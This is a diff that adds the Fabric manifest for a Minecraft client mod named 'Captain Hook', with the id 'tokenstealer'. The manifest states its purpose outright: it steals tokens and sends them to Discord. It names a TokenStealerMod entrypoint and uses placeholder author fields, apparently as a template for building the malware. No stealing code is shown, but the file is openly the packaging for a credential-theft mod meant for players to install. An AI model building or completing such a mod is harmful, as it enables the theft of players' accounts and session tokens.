@@ -1,0 +1,21 @@
+{
+  "schemaVersion": 1,
+  "id": "tokenstealer",
+  "name": "Captain Hook",
+  "version": "${version}",
+  "description": "Steals tokens and sends them to Discord.",
+  "authors": ["You"],
+  "contact": {},
+  "license": "MIT",
+  "environment": "*",
+  "entrypoints": {
+    "client": [
+      "com.yourname.TokenStealerMod"
+    ]
+  },
+  "depends": {
+    "fabricloader": ">=0.14.0",
+    "minecraft": "^1.20.1",
+    "java": ">=17"
+  }
+}
